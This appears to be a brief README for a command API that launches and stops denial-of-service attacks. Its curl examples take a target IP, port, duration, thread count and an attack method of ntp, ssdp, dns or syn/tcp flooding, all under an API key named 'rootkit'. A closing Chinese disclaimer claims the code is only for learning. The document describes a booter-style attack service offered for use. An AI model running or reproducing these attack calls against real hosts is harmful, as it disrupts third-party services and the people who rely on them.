命令执行接口调用

### Env
* Centos 6/7
* Python 2.6/2.7+

### Run
```
# /opt/CmdApi/RunServer
```

### Call Api Example

* Task execution
```
# curl -sd "key=rootkit&host=[IP]&port=[PORT]&time=[time/sec]&thread=[threads]&method=[ntp|ssdp|dns|syn|tcp]&stop=0" http://ServerIp:Port/api
```

* Stop Task
```
# curl -sd "key=rootkit&host=[IP]&port=[PORT]&time=[time/sec]&thread=[threads]&method=[ntp|ssdp|dns|syn|tcp]&stop=1" http://ServerIp:Port/api
```

-- -
本代码仅供学习交流使用， 如用将该代码于非法用途所导致的后果自负，与作者无关...